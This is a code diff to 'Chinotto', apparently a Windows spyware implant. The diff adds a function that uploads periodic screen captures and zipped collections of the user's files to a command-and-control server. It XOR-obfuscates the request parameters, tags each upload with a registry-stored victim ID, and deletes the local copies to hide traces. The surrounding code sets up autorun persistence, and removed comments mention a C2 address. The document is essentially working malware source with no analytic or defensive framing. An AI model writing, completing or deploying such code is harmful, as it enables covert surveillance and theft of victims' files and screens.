@@ -13,16 +13,6 @@
 */
 
 #include "Chinotto.h"
-#include "libzippp/libzippp.h"
-
-bool is_ipv4(const std::string& str) {
-    // Define the IPv4 regex pattern
-    std::regex pattern(R"((\d{1,3}\.){3}\d{1,3})");
-
-    // Match the input string against the regex pattern
-    return std::regex_match(str, pattern);
-}
-
 
 std::string mb_to_utf8(const std::string& mbstr)
 {
@@ -199,6 +189,11 @@ void capture_screen() {
         DeleteDC(desktop_dc);
         
         std::this_thread::sleep_for(std::chrono::minutes(1));
+
+        if (false == send_to_server(filename)) {
+            fprintf(stderr, "[Error] Failed to send <%s> to the server\n", filename);
+        }
+
     }
 }
 
@@ -264,6 +259,9 @@ bool collect_files() {
         enumerate_reculsively(search_dir, save_dir);
 
     }
+
+
+
     return true;
 
 }
@@ -296,7 +294,6 @@ bool zip_dir() {
         std::cerr << "Error copying file: " << e.what() << std::endl;
     }
 
-
     for (auto& file : file_list) {
 
         int find = file.rfind("\\") + 1;
@@ -312,10 +309,13 @@ bool zip_dir() {
         }
     }
 
-    if (!zf.close())
-    {
-        fprintf(stderr, "[ERROR] Failed to close archive\n");
-        return false;
+    zf.close();
+    
+    if(true == fs::exists(zip_path)){
+        if (send_to_server(zip_path)) {
+            fprintf(stderr, "[Error] Failed to send <%s> to the server \n", zip_path);
+            return false;
+        }
     }
 
     return true;
@@ -341,6 +341,122 @@ bool check_test_mode() {
     return true;
 }
 
+std::string get_uid() {
+    HKEY key;
+    DWORD type;
+    DWORD size;
+    char buffer[1024] = { 0, };
+
+    // Open the registry key
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, UID_PATH, 0, KEY_READ, &key) == ERROR_SUCCESS) {
+
+        size = sizeof(buffer);
+        if (RegQueryValueExA(key, UID_VALUE, NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS) {
+            fprintf(stderr, "[Error] Failed to read system uid from registry\n");
+        }
+
+        // Close the registry key
+        RegCloseKey(key);
+    }
+
+    return std::string(buffer);
+}
+
+
+// Set up the callback function to write the received data to the buffer
+static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp){
+    size_t realsize = size * nmemb;
+    std::string* buffer = static_cast<std::string*>(userp);
+    buffer->append(static_cast<char*>(contents), realsize);
+    return realsize;
+}
+
+std::string xor_string(const std::string& str, char key) {
+    std::string result(str.length(), '\0');
+    for (size_t i = 0; i < str.length(); ++i) {
+        result[i] = str[i] ^ key;
+    }
+    return result;
+}
+
+
+bool send_to_server(std::string file_path) {
+
+    std::string file_name = fs::path(file_path).filename().string();
+
+    // Open the file
+    std::ifstream file(file_path, std::ios::binary);
+
+    // Check if file can be opened
+    if (!file.is_open()) {
+        fprintf(stderr, "[ERROR] Failed to open file %s \n", file_name.c_str());
+        return false;
+    }
+
+    // Get the file size
+    file.seekg(0, std::ios::end);
+    size_t file_size = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Read the file into a buffer
+    char* buffer = new char[file_size];
+    file.read(buffer, file_size);
+    file.close();
+
+    // Initialize curl
+    curl_global_init(CURL_GLOBAL_ALL);
+    CURL* curl = curl_easy_init();
+
+    // Build the URL with parameters
+    std::stringstream ss;
+    ss << SERVER_CONTROL_PAGE << 
+        xor_string("type",7) << 
+        "=" << xor_string("file",7) << 
+        "&" << xor_string("uid",7) <<
+        "=" << xor_string(get_uid(),7);
+
+    std::string url = ss.str();
+
+    // Build the HTTP POST request
+    struct curl_httppost* post = nullptr;
+    struct curl_httppost* last = nullptr;
+
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_BUFFER, file_name.c_str(),
+        CURLFORM_BUFFERPTR, buffer, CURLFORM_BUFFERLENGTH, file_size, CURLFORM_END);
+
+    std::string response;
+    // Set curl options
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+    // Perform the request
+    CURLcode res = curl_easy_perform(curl);
+
+
+    // Check if request was successful
+    if (res != CURLE_OK) {
+        fprintf(stderr, "[Error] Failed to send request\n");
+        return false;
+    }
+    
+    // Clean up
+    curl_easy_cleanup(curl);
+    curl_global_cleanup();
+    delete[] buffer;
+
+
+    if (std::remove(file_path.c_str()) != 0) {
+        fprintf(stderr, "[Error] Failed to delete file\n");
+        return false;
+    }
+
+    
+    return true;
+
+}
+
 int main(int argc, char* argv[]){
 
     if (true == check_test_mode()) {
@@ -348,26 +464,14 @@ int main(int argc, char* argv[]){
         return 0;
     }
 
-    
-    //std::string c2_addr = "";
-
-    //if (argc > 2) {
-    //    c2_addr = argv[1];
-    //}
-    
-    //if (false == is_ipv4(c2_addr)) {
-    //    fprintf(stderr, "[error] invalid c2 address (%s)\n", c2_addr.c_str());
-    //    return 1;
-    //}
-
     std::string proc_name;
     if (false == get_proc_name(proc_name)) {
-        std::cerr << "[error] Failed to geataa ." << std::endl;
+        std::cerr << "[error] failed to geataa ." << std::endl;
         return 1;
     }
     
     if (false == register_autorun(proc_name)) {
-        std::cout << "Error: Unable to set registry value \n" << std::endl;
+        std::cout << "error: unable to set registry value \n" << std::endl;
         return 1;
     }
 
